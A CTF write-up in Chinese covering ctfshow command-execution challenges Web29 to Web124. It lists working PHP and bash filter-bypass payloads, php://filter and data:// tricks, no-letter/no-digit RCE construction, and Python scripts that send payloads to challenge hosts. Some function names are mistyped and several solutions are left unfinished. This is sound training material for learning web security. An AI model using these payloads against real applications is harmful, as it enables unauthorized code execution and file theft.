# Ctfshow(命令执行)

## Web29：

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/2f1c94cea0c42fd698f2891f962782b3.png)

解题思路：看一遍代码，c是传入的参数且eval函数的作用是将输入的字符看成php代码执行，且其中flag的大小写被过滤，所以使用通配符来进行绕过，首先查看文件目录。

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/7b8831979943b7f39a8b33064ec8d4e3.png)

使用通配符进行绕过。

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/5a4a00d9c3edb75eb07189926faaacc1.png)

## Web30：

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/62951a29e1dd2ceac753f8ba944dae94.png)

解题思路：代码审计，preg\_match查找到匹配的字符串，加上！是不能匹配到相应的字符串，/模式分隔符后的"i"标记这是一个大小写不敏感的搜索。发现/flag/system/和php的大小写都被列入黑名单。所以应该通过其他命令执行绕过。例如/?C=echo`ls`; 查看根目录。

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/09ba7ab50b6890d2c5cd3417e88b79b3.png)

然后直接通过/？c=echo`cat fl*`;获取flag.

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/986b6e426f4157f891093bb7707985ae.png)

## Web30:

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/de8dd4e56edb5894b26d79c7059229a0.png)

解题思路：代码审计，flag，system，php，cat，sort，shell，空格，被过滤掉。

使用/？C=echo`ls`;查看根目录。

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/efac85344525f735d5906bec4c20902a.png)

然后使用/？C=echo`tac%09fla*`;

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/20ee23ec449764de44342aab00d4bc5b.png)

## Web31:

同web30一样，首先使用/?C=echo`ls`;查看根目录。

然后通过/？C=ech`tac%09fla*`;获得flag。

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/d550f1c6ded7689645c31748d25de590.png)

## Web32、32、34、35：

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/4b769abb056f663005d751e70e64b756.png)

解题思路：代码审计，发现flag，system,php,sort,shell,echo,空格，反引号，都被pass了。

所以我们应该去找一个不带括号的命令执行函数，通过查询可以发现有以下不需要括号的函数，我们可以使用include，先给c传入1，再通过&给1赋值，进行绕过。

php://filter/read=convert.base64-encode/resource，该处用到了php伪协议filter：//访问文件这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。

这个东西可以获取指定文件的源码，当它与包含函数结合时会将其作为php文件执行。

而这时我们一般将其编码而阻止其作为php文件执行从而获得编码后的源码。

我们通过convert.base64-encode将源码进行base64编码，它就能输出编码后的源码了，而不是作为php文件被执行。

/?c=include%09$\_GET[1]?\>&1=php://filter/read=convert.base64-encode/resource=flag.php 
![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/e6bfd02189983f08138e3db2568a2a0e.png)

通过以上命令执行可以得到一个base64编码，通过解码即可得到flag。

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/e61a2c08a9fcc7fb22e53cccbaad0422.png)

## Web36:

解题思路：同上，不过该题有点不同的是禁用了数字，这时我们可以用英文字母传参。

?c=include%09$\_GET[p]?\>&p=php://filter/read=convert.base64-encode/resource=flag.php

## Web37:

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/957eae9ff7b9d82bf77f02070cf0bc56.png)

解题思路：该题和前面的不太一样，这里不需要进行传参，我们要使用php的另一个伪协议data://伪协议，/?c=data://text/plain,\<?Php echo `cat fl*`;?\>

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/667edd2a7f05a666222b6e88ddf5bc48.png)

## Web38:

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/440c3ba1a632ff302efb1cdc556964de.png)

解题思路：本题和上一题差不多，不过该题过滤了php，所以不能使用正常标签，而应该使用短标签，/?c=data://text/plain,\<?=system("ls");?\>查看目录，然后

/?c=data://text/plain,\<?=system("cat f???.???");?\>

②法/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==

该base64解码为\<?php system('cat flag.php');?\>

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/c4dbd2066d80be9472a074f05ff8914a.png)

## Web39:

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/26a9d1c79207bc7a0c257832d3771189.png)

解题思路：与38差不多，不过这里限制了.php后缀，这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用。/?c=data://text/plain,\<?=system("cat f???.???");?\>

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/7bbed8deaa5c2d9e1735ada89750034b.png)

## Web40：

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/0dd31ebcef4c7c1e46bfb0934aad08a9.png)

解题思路：过滤了引号、美元符号、冒号，这里可以构造无参数函数进行文件读取，正则中的括号不是英文的 是过滤了中文的括号。用get\_defined\_vars()来获取所有已定义的变量。

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/eec81c2bfa43c4e1c5bfb8caa955a028.png)

利用current() 返回数组中的当前元素的值。

每一个数组中都有一个内部的指针指向它的"当前"元素，初始指向插入到数组的第一个元素

！注意：该函数不会移动数组内部的指针，要想移动，可以使用next（）和prev（）函数。用法

如下图：

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/9b2a20e0cc6b66b38a6baa3837153045.png)

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/80ca0ad66a8c1a704547fd7704a40253.png)

然后利用end输出该元素值。

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/271d509e212afd04ee5787a598d1b067.png)

然后利用eval执行。可以得到全部内容，之后cat得到flag。

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/41f21e0c47d8e60cd20db158e121200a.png)

利用tac fl??.???得到flag。

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/208440822678c49cb288de0fc97a5ccc.png)

方法②：?c=show\_source(next(array\_reverse(scandir(pos(localeconv())))));

localeconv()的第一个元素是"." ,用pos()可以返回数组第一个元素的值。所以结合起来就是 scandir(".") 相当于返回当前目录下文件的数组，最后用print\_r输出。

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/40831c8a657637a9d2f6a4c30c75593e.png)

用array\_reserve()把数组内元素顺序倒过来，flag就变成数组中的第二项，然后可以用next()取出（默认指针停留在数组第一项）。最后我们可以用read\_file()、highlight\_file()和show\_source()读出源码,拿到flag。

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/3fd27487ff3235625973f729ad951665.png)

**Web41**** ：**（无数字字母的rce）

核心代码：

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/f639041beb0ca76c25831f3c5ef0c160.png)

无数字字母rce，这是一个老生常谈的问题，就是不利用数字和字母构造出webshell，从而能够执行我们的命令。这里的思路就是利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说assert，然后就可以动态执行了。所以说这里的核心就是非字母的字符换成字母字符。

通过脚本来实现：

import re

import requests

url="http://2a2e4b71-f1ff-4953-8b14-bd26f6633fdc.challenge.ctf.show/"

a=[]

ans1=""

ans2=""

for i in range(0,256):

c=chr(i)

tmp = re.match(r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-',c, re.I)

if(tmp):

continue

#print(tmp.group(0))

else:

a.append(i)

# eval("echo($c);");

mya="system" #函数名 这里修改！

myb="ls" #参数

def myfun(k,my):

global ans1

global ans2

for i in range (0,len(a)):

for j in range(i,len(a)):

if(a[i]|a[j]==ord(my[k])):

ans1+=chr(a[i])

ans2+=chr(a[j])

return;

for k in range(0,len(mya)):

myfun(k,mya)

data1="(\""+ans1+"\"|\""+ans2+"\")"

ans1=""

ans2=""

for k in range(0,len(myb)):

myfun(k,myb)

data2="(\""+ans1+"\"|\""+ans2+"\")"

data={"c":data1+data2}

r=requests.post(url=url,data=data)

print(r.text)

通过这个脚本我们便可以得到flag：

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/28f9bcdeb24bde0f368dbc7b28648bc2.png)

## Web42：

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/9260908cb5a700504c92e8fbdf8cc2ea.png)

解题思路：

/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。
 2\>&1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。

总的来说主要意思是不进行回显，可以将其理解成将输入的数写入黑洞，也就是说只要执行一个命令都无效。我们要让命令回显，那么进行命令分隔即可。

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/f14589870c54962bbfbcc44c1f73126a.png)

/?c=cat flag.php; 或者/?c=cat flag.php|| 或者cat flag.php&&cat flag.php

(注意&要转换为url编码%26)即/?c=cat%20flag.php%26%26cat%20flag.php

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/1d183e0237f6eb8ba5826f9f3c8239be.png)

## Web43：

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/938621ab091d9ca27720bad4a41630f8.png)

解题思路：该题与42差不多，不过过滤了cat，我们可以使用以下命令获取flag。

/?c=tac flag.php||

/?c= tac flag.php%26%26tac flag.php

?c=more flag.php||

?c=sort flag.php||

?c=less flag.php||

?c=tac flag.php||

?c=tail flag.php||

?c=nl flag.php||

?c=strings flag.php||

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/bf4fec03ca7f580f7ac7420b62aa938c.png)

## Web44：

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/e1d28502a246f2b7688b65098fa46546.png)

解题思路：与42，43差不多，不过是过滤了falg和cat。

## Web45：

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/cb765abd357626a3b87cd5f696d14b36.png)

解题思路：；cat，flag，空格，数字，都被过滤掉了。

/?c=tac%09fl??.php||

/?c=tac%09fl??.php%26

## Web46,47,48,49：

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/b00501346fdab0d1f8b933a5f23015c9.png)

解题思路：同上。

/?c=tac%09fl??.php||

## Web50:

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/641fc3c41bf17b390f1a0cdc5c2f0995.png)

解题思路：这里和前面差不多，但是%09也被过滤了，但空格不只有这个可以替代，也可以使用\<\>代替，但这里需要注意如/?c=tac\<\>fl??.???||是会失败的，这是因为\<\>不能和？一起出现否则会失败的。应该是这样的/?c=tac\<\>fla\g.php||

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/e54b7394bb90f9886233d32ffd9cea08.png)

## Web51：

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/76a14cd71504468d171b974dda625a79.png)

解题思路：同上。

/?ca\t\<\>fla\g.php||

/?nl\<\>fla\g.php||

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/35ddf57f1aa61c9f25e9746afebaf49a.png)

## Web52:

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/41afa333506e4d933e0246326b86665d.png)

解题思路：这里可以看到\<\>也被过滤，所以我们可以换用${IFS}替换空格。

关于IFS的解释：
 Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。而 IFS 是一种 set 变量，当 shell 处理"命令替换"和"参数替换"时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。

/?C=nl${IFS}fla\g.php||

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/d66cdfaef5a02dea57fa1664ffed45da.png)

发现这并不是flag，然后我们需要查看根目录，/?c=ls${IFS}||

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/68ad33ab09f71e8a8ea812e10e86701c.png)然后构造palyload：/?c=nl${IFS}/????||

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/5a0367a0bc95eadee256fe3f79f3ec73.png)

## Web53:

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/d4c6c34801b5c228c93c4b0701f6f6c1.png)

解题思路：本题没有了黑洞，所以不用使用命令分隔符。

Playload：/?c=nl${IFS}fla\g.php

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/232731c1fe3689172eea26049a31877a.png)

## Web54:

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/18f27e92381431e8b47604e7afbf1901.png)

解题思路：本题过滤了很多东西，不能直接通过cat或等同于cat的命令查看flag.php，所以我们应该换用其他linux查看文件的命令。

例如grep，mv，paste

Playload：

/?c=mv${IFS}fla?php${IFS}a.txt

(mv命令用来为文件或目录改名、或将文件或目录移入其它位置。,改完名字直接访问)

/?c=grep${IFS}'fla'${IFS}fla??php

（在 flag.php匹配到的文件中，查找含有fla的文件，并打印出包含 fla 的这一行）

/?c=past${IFS}fla?????

/?c=uniq${IFS}fla?????

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/d1eb5e9796c077602fa09b89174c72cd.png)

## Web55:

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/d4ed6aadb62f59521a258525b641b16d.png)

解题思路：该题过滤了所有字母，但是没有过滤数字，所以我们需要不带字母的命令获取flag。

方法一：、匹配到/bin目录下的命令cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，我们可以使用base64

Palyload：/?c=/???/????64 ???????? 等价于/?c=/bin/base64 flag.php

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/5a3ed940a83a9b388d1603b055996b59.png)

方法二：bzip2命令

思路：将flag文件进行压缩，然后再访问下载。

/usr/bin目录下主要放置一些应用软件工具必备的执行档。

Playload：?c=/???/???/????2 ????.??? 也就是/usr/bin/bzip2 flag.php

然后访问/flag.php bz2,下载解压即可。

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/87e0d99c51ac94a8fb3c67cb63701a51.png)

## Web41、56：

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/ea3afcaedec903286da2e12d29af8a2c.png)

解题思路：无数字字母的rce，看到这我们可以想到一个便洁的方法，写脚本。

import requests

while True:
 url = "http://28678ba1-1214-4511-adcb-6b04d3e57a88.challenge.ctf.show/?c=.+/???/????????[@-[]"
 r = requests.post(url, files={"file": ('feng.txt', b'cat flag.php')})
 if r.text.find("flag") \> 0:
 print(r.text)
 break

得到flag：

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/a93accd7360e8d7b676bb44f2357c676.png)

## Web57：

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/f407472a85814f8c26ec8b540d9d6ac5.png)

解题思路：该题给了提示flag在36.php里面，我们可以通过"取反"

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/acd9c093fc81180e8f7b28e569e2312b.png)

echo ${\_} #返回上一次的执行结果

echo $(()) #0

echo $((~$(()))) #~0是-1

$(($((~$(())))$((~$(()))))) #$((-1-1))即$$((-2))是-2

echo $((~-37)) #~-37是36

┌──(amateur㉿kali)-[~]

└─$ echo $((~$(())))

-1

┌──(amateur㉿kali)-[~]

└─$ echo $((~$(($((~$(())))+$((~$(())))))))

1

┌──(amateur㉿kali)-[~]

└─$ echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))))))


所以我们需要输入$((~$(())))36次，     然后通过在两端加上$((~$(( ))))等价于-1

来个python脚本。

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/86626dc2c0a92491862d926b6b7b755c.png)
得到：

$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))

最终的playload：

/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/50a82e72dba57b9c263cfa7e44754b8b.png)

## Web58--65:

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/915cc864d422adffea9665d2384fa67c.png)

解题思路：post传参，禁用函数，通过高亮显示php文件。

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/f05c8a6ae250fbb6ee40fc0d4de00305.png)

Playload:c=show\_source('flag.php'); c=highlight\_file("flag.php");

## Web66

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/445c7cab3a045814d517a807c64afb16.png)

解题思路：需要通过post传参，但是我们会发现show\_source（）被禁用了，所以使用highlight\_file()查看文件，首先通过c=print\_r(scandir("/"));查看根目录下文件，然后通过c=highlight\_file("/falg.txt");便可以得到flag。

## Web67：

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/ccc5c22db58d3e96410ecac95ce99018.png)

解题思路：这题和上面的题一样，但是如果你按上一题我的方法是不行的，因为c=print\_r(scandir("/"));被禁用了。但是呢我们不止这一个可以查看根目录文件。

c=var\_dump(scandir('/'));

c=$a=new DirectoryIterator("glob:///\*");foreach($a as $f){echo($f-\>\_\_toString().' ');}exit(0);

这两个都是可以的。然后c=highlight\_file("/falg.txt");便可以得到flag。

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/0d1849df6b5411341766d29a5aa2d165.png)

## Web68：

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/29b8f42cd4cab7454dd431cb1b663b90.png)

解题思路：该源码表明，highlight\_file()被禁用所以源码无法查看直接报错。

通过以下的方式查看根目录。

c=var\_dump(scandir('/'));

c=$a=new DirectoryIterator("glob:///\*");foreach($a as $f){echo($f-\>\_\_toString().' ');}exit(0);

然后通过以下方式可以查看根目录文件。

c=highlight\_file('/flag.txt');

c=include('/flag.txt');

c=require('/flag.txt');

c=require\_once('/flag.txt');

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/0965c7a2295ab0db2cd966524b4ae3e8.png)

## Web69：

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/90f892ba38aab6147f29470de22eb209.png)

解题思路：发现c=var\_dump(scandir('/'));被禁用，可以通过以下发生查看根目录。

c=var\_export(scandir('/'));

c=$a=new DirectoryIterator("glob:///\*");foreach($a as $f){echo($f-\>\_\_toString().' ');}exit(0);

然后通过c=include("/flag.txt");便可以得到flag。

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/48667a5330093224f93f444c4d83b4e6.png)

## Web70：

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/c3589782d8e638d25f73c32ef38f053c.png)

解题思路：c=var\_export(scandir('/')); 然后c=include("/flag.txt");

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/7d2e12b08d531044277d4f6f4fd18961.png)

## Web71：

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/617544da264e3a9c6bdba9ebd2606ad2.png)

解题思路：$s = ob\_get\_contents();//得到缓冲区的数据。

ob\_end\_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容 。

解决办法：c=var\_export(scandir('/'));发现输出的一大堆问号，原来是因为源码中用函数将缓冲区的所有字符全部替换为问号，那么可以用exit()/die()提前结束，这样就不会将字符替换为问号。

Playload：c=var\_export(scandir('/'));exit();

c=include("/flag.txt");die();

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/9cf84e2fd45cf4c4e2f9b951fa020892.png)

**Web72**** （不会）**：

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/284e9ae8aeafa89487e8f68e150fd02c.png)

解题思路：

var\_export(scandir('.'));die(); #可以正常读取

var\_export(scandir('/'));die(); #读取失败

得出开启了open\_basedir，

open\_basedir可将用户访问文件的活动范围限制在指定的区域，通常是其家目录的路径。

所以要先绕过open\_basedir。首先排除命令执行绕过的可能，disable\_function已经禁用了命令执行函数（不知道有没有什么办法绕过）。可以使用glob伪协议绕过，glob伪协议筛选目录不受open\_basedir的制约。

## Web73：

解题思路：c=var\_export(scandir('/'));exit();查看根目录。

c=include("/flagc.txt");exit(); 得到flag。

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/a7d897a82dec4d7d7c646e383620dbe3.png)

## Web74：

解题思路：利用glob协议，查看根目录文件

c=$a=new DirectoryIterator("glob:///\*");foreach($a as $f){echo($f-\>\_\_toString().' ');}exit(0);

然后通过c=include("/flagx.txt");exit();

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/43ccb95150fe0361bcf44519844913a5.png)

## Web75，76:

使用glob协议可以得到flag所在的根目录，但是下一步我尝试了执行sql语句读取flag但是却失败了，不知道怎么办。

## Web77：

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/1714fa9ee1d0ba22fbd1a096867a070f.png)

解题思路：根据提示使用PHP7.4以上才有的FFI进行命令执行，FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag。但是最后读取/1.txt却失败了，不知道怎么回事。

## Web118：

先了解一下bash内置变量

root@baba:~# echo ${PWD}

/root

root@baba:~# echo ${PWD:1:1} //表示从第2（1+1）个字符开始的一个字符

r

root@baba:~# echo ${PWD:0:1} //表示从第1（0+1）个字符开始的一个字符

/

root@baba:~# echo ${PWD:~0:1} //表示从最后一个字符开始的一个字符

t

root@baba:~# echo ${PWD:~A} //字母代表0

t

所以可以利用各个环境变量的最后一位来构造命令。 ${PWD}在这题肯定是/var/www/html，而${PATH}通常是bin,那么${PWD:~A}的结果就应该是' l '，因为${PATH:~A}的结果是' n '，那么他们拼接在一起正好是nl，能够读取flag，因为通配符没有被过滤，所以可以用通配符代替flag.php。

Payload：code=${PATH:~A}${PWD:~A} ????.???

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/756a51ae7017c6f123a3680889a508b1.png)

![image.png](https://img07.mifile.cn/v1/MI_542ED8B1722DC/de100164be36ee999ef694bc33258072.png)

## Web119：

解题思路：该题比上一题多禁用了path，我们需要构造/bin/cat falg.Php

${SHLVL} //一般是一个个位数

${#SHLVL} //1，表示结果的字符长度

${PWD:${#}:${#SHLVL}} //表示/

${USER} //www-data

${PHP\_VERSION:~A} //2

${USER:~${PHP\_VERSION:~A}:${PHP\_VERSION:~A}} //at

由以上的可以构造出：

${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~${PHP\_VERSION:~A}:${PHP\_VERSION:~A}} ????.???

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/343c2b4e8e7da64e0df1d08102ae2482.png)

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/5939c69d80b172b705db240a7ca6654b.png)

## Web120：

解题思路：path被过滤采用shell的base加密，可以构造出/bin/base64 flag.php，只需要/和4两个字符就行，其他的可以用通配符代替。

/很简单，pwd的第一位就是，因为这题ban了数字，所以可以用该题值必是1的${#SHLVL}绕过

SHLVL

是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。

只需要${PWD::${SHLVL}}，结果就是/

RANDOM

此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。

4的问题，可以用${#RANDOM}，在Linux中，${#xxx}显示的是这个值的位数不加#是变量的值，加了#是变量的值的长度，例如12345的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此可以代替4.

payload：由于是随机的所以要多试几次。

code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/2ab55c77efaeedfbdece23d57b5faf88.png)

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/66f3bb1cd98fc6489afa0b5d149402ff.png)

## Web121：

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/f8798eac0d787d33df5951b524257661.png)

解题思路：该题的path，和shlvl被禁用。

$# $? 这两个的值都为0

加上#代表长度就为1

这题最关键的SHLVL被过滤了，可以用${##}或${#?}代替

①code=${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???

②code=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???

Payload：${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.??? // /bin/base64 flag.php

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/6438ab4aacfb02e403aea843e91efcd7.png)

## Web122：

![image.png](https://img03.mifile.cn/v1/MI_542ED8B1722DC/3ba91c96f42364663d6e26e7ab2e9592.png)

解题思路：这题在上题的基础上又过滤了#和PWD，PWD的绕过很简单，用HOME就可以，而#,就要用到$?了

$? 执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)所以在使用$?之前要先给错误的命令 让$?的值为1

${}和 \<A可以但是题目上${}这个不可以

所以用\<A后边的数字4还是用RANDOM随机数来获取

payload：code=\<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???

![image.png](https://img08.mifile.cn/v1/MI_542ED8B1722DC/12aa98990ec11dbc040b5714ad30158d.png)
## Web124：

解题思路：该题给了很多数学函数白名单，所以可以想进制转换，16进制可以转字符串，10进制可以转16进制。所以我们可以构造如下命令

c=$\_GET[a]($\_GET[b])&a=system&b=cat flag 我们需要构造的是其实只有 \_GET，$我们可用使用，中括号可用花括号代替，小括号也是可以使用的。这时候我们想到了一个办法，如果可以构造出hex2bin函数就可以将16进制转换成字符串了。我们又可以用decoct将10进制转换成16进制。也就是可以将10进制转换成字符串。那么问题来了，hex2bin怎么构造呢，这时候就需要用到base\_convert了。我们发现36进制中包含了所有的数字和字母，所有只需要将hex2bin按照36进制转换成10进制就可以了。

--10---16--字符串。

①echo base\_convert('hex2bin', 36, 10);

结果 37907361743

36进制转化为10进制

②echo hexdec(bin2hex("\_GET"));

结果 1598506324

bin2hex 将字符串转换为16进制，然后将16进制转换为10进制。

现在我们要做的就是反过来了

③base\_convert('37907361743',10,36); hex2bin

④base\_convert('37907361743',10,36)(dechex('1598506324')); \_GET

dechex将10进制转换为16进制

c=$pi=\_GET;$$pi{abs}($$pi{acos})&abs=system&acos=tac f\*

payload:c=$pi=base\_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos})&abs=system&acos=tac f\*（标蓝处还不理解）

![image.png](https://img06.mifile.cn/v1/MI_542ED8B1722DC/ea5fc1bb966344e252d370070406f121.png)